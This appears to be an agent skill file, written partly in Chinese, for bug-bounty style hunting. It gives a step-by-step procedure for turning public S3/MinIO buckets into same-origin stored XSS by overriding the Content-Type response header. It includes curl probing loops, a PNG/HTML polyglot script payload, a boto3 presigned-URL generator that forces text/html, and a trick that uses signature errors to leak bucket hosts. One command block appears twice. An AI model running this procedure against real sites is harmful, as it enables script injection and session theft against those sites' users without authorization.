---
name: s3-minio-content-type-xss
description: 利用公开存储桶的 Content-Type 覆盖，在目标源站上实现存储型 XSS。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl, python3
metadata:
  tags: [recon, S3, MinIO, bucket, XSS, Content-Type, cloud, storage]
  category: recon
  related_skills:
    - hunt-xss
    - hunt-cloud-misconfig
    - hunt-firebase
    - hunt-supabase
    - js-secrets-extraction
---

# S3/MinIO Content-Type 覆盖导致存储型 XSS

通过查询参数覆盖 `Content-Type` 响应头来利用公开的云存储桶（S3、MinIO 及兼容实现）。当目标从自己的源站（例如 `cdn.target.com` 或 `target.com/uploads/`）提供用户上传的文件时，一次成功的覆盖就能把存储的 HTML/JS payload 变成同源存储型 XSS — 绕过应用在上传时执行的所有校验。

## When to Use

- 目标从公开存储桶提供用户上传的文件（图片、头像、附件）。
- 文件在目标自己的域名或子域名下提供（而非随机存储域名）。
- 上传校验看起来较为完善（扩展名白名单、magic byte 检查、强制 Content-Type）— 覆盖是在服务时而非上传时绕过以上全部校验。
- 存储桶 URL 对 `?response-content-type=` 的请求返回改变后的 Content-Type。
- 存储桶返回 AWS SignatureDoesNotMatch 错误，泄露真实的存储桶主机与区域。

## Prerequisites

- 具备 curl 和 python3 的 `terminal`。
- 识别出至少一个由存储提供服务的公开对象 URL。
- 进行 S3 利用：自有的 AWS 账户凭据（免费套餐即可）。

## How to Run

```bash
# Test if an object's Content-Type can be overridden (MinIO and compatible)
curl --max-time 30 --connect-timeout 10 -skI "https://cdn.target.com/uploads/avatar123.png?response-content-type=text/html" | grep -i content-type

# If you get 'text/html', the override works — proceed to exploitation
# If you get 'Request specific response headers cannot be used for anonymous GET requests', it's S3 — use signed URL approach
```

## 快速检测

```bash
# Test if an object's Content-Type can be overridden (MinIO and compatible)
curl --max-time 30 --connect-timeout 10 -skI "https://cdn.target.com/uploads/avatar123.png?response-content-type=text/html" | grep -i content-type

# If you get 'text/html', the override works — proceed to exploitation
# If you get 'Request specific response headers cannot be used for anonymous GET requests', it's S3 — use signed URL approach
```

## Procedure

### 阶段 1 — 识别公开对象

查找被公开提供访问的上传对象：

```bash
# Check common upload paths
for path in /uploads/ /media/ /static/uploads/ /cdn/ /files/ /assets/img/ /storage/; do
  curl --max-time 30 --connect-timeout 10 -skI "https://target.com${path}" | grep -E "HTTP|Content-Type|x-amz"
done

# Look for S3/MinIO signatures in URLs
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/" | grep -Po '(?:s3\.|amazonaws\.|minio|storage\.googleapis)[^"'\''\s]{5,60}'
```

### 阶段 2 — 测试 Content-Type 覆盖

追加查询参数并检查响应：

```bash
OBJECT_URL="https://cdn.target.com/uploads/avatar123.png"

# Test override
curl --max-time 30 --connect-timeout 10 -skI "${OBJECT_URL}?response-content-type=text/html" | grep -i content-type
```

**响应解读：**

| 响应 | 含义 | 操作 |
|---|---|---|
| `Content-Type: text/html` | MinIO 或兼容实现 — 匿名覆盖成功 | 进入阶段 3 |
| `Request specific response headers cannot be used for anonymous GET requests` | AWS S3 — 覆盖需要签名请求 | 进入阶段 4 |
| Content-Type 未发生变化 | 不支持覆盖 | 检查其他查询参数或放弃 |

### 阶段 3 — MinIO 利用（匿名覆盖）

上传一个伪装成合法图片、内含 HTML/JS payload 的文件：

```python
# Craft a polyglot file: valid PNG header + HTML payload
payload = b'\x89PNG\r\n\x1a\n' + b'<script>alert(document.domain)</script>'
```

通过应用正常的上传流程上传。应用会校验 PNG 文件头并接受该文件。随后以如下方式提供它：

```bash
# The browser renders the file as HTML, executing the script
curl --max-time 30 --connect-timeout 10 -sk "https://cdn.target.com/uploads/evil.png?response-content-type=text/html"
```

其他可测试的 MinIO 覆盖参数：

| 参数 | 被覆盖的响应头 |
|---|---|
| `response-content-type` | `Content-Type` |
| `response-content-disposition` | `Content-Disposition` |
| `response-cache-control` | `Cache-Control` |
| `response-content-encoding` | `Content-Encoding` |
| `response-content-language` | `Content-Language` |

### 阶段 4 — S3 利用（签名覆盖）

S3 会拒绝匿名覆盖。使用你自己的 AWS 凭据对请求重新签名：

```python
import boto3
from botocore.client import Config

def generate_s3_xss_url(bucket, key, region, endpoint_url, content_type="text/html"):
    s3 = boto3.client(
        "s3",
        region_name=region,
        endpoint_url=endpoint_url,
        config=Config(signature_version="s3v4", s3={"addressing_style": "virtual"}),
    )
    url = s3.generate_presigned_url(
        "get_object",
        Params={"Bucket": bucket, "Key": key, "ResponseContentType": content_type},
        ExpiresIn=3600,
    )
    return url

# Usage: python3 s3_xss.py <bucket> <key> <region> <endpoint> [content-type]
# Example: python3 s3_xss.py target-bucket uploads/avatar.png us-east-1 https://s3.us-east-1.amazonaws.com text/html
```

如果存储桶名称未知，可使用错误的主机或区域进行签名以触发 `SignatureDoesNotMatch` 错误。错误响应会泄露包含真实存储桶主机与区域的规范请求（canonical request）。

### 阶段 5 — 验证影响

仅当对象 URL 位于目标域名下时，该 XSS 才是同源的。验证方式：

```bash
# Check if the object is served under the target's origin
echo "$OBJECT_URL" | grep -qE "^https?://(www\.)?target\.com" && echo "SAME-ORIGIN XSS" || echo "Cross-origin — lower impact"

# Confirm JavaScript execution context
# The payload runs with access to cookies, localStorage, and API endpoints on the target's origin
```

## Pitfalls

- **跨源存储桶影响较低。** 如果存储桶位于 `s3.amazonaws.com` 或某个随机存储域名上，XSS 会在隔离的源中执行，无法访问目标的会话。
- **必须支持该覆盖。** 并非所有存储系统都支持响应覆盖参数。除 AWS/MinIO 之外的 S3 兼容系统可能使用不同的参数名。
- **上传校验对 payload 投递仍然重要。** 文件必须通过上传时的检查才能进入存储桶。请使用同时满足校验器与浏览器的多语言（polyglot）文件。
- **签名 S3 URL 会过期。** 生成的预签名 URL 具有可配置的过期时间。XSS 链接在过期后即失效。
- **CloudFront/CDN 可能缓存原始的 Content-Type。** 若存储桶前有 CDN，它可能忽略查询参数的覆盖。请同时测试 CDN URL 与直连存储桶 URL。

## Verification

1. 确认覆盖生效：`curl -skI "${URL}?response-content-type=text/html"` 返回 `Content-Type: text/html`。
2. 通过应用正常的上传流程上传测试 payload。
3. 在浏览器中携带覆盖参数访问已上传的文件 — 验证 JavaScript 执行。
4. 确认同源：对象 URL 与目标共享域名（而非第三方存储域名）。
5. 记录完整链路：上传绕过技术 → 覆盖参数 → 同源 XSS。

---

## 相关技能

- **`hunt-xss`** — 通用 XSS 检测方法与绕过表。
- **`hunt-cloud-misconfig`** — 公开存储桶发现与云存储配置错误。
- **`hunt-firebase`** / **`hunt-supabase`** — Firebase/Supabase 存储桶利用。
- **`js-secrets-extraction`** — 在 JavaScript 打包文件中查找存储桶名称与存储端点。
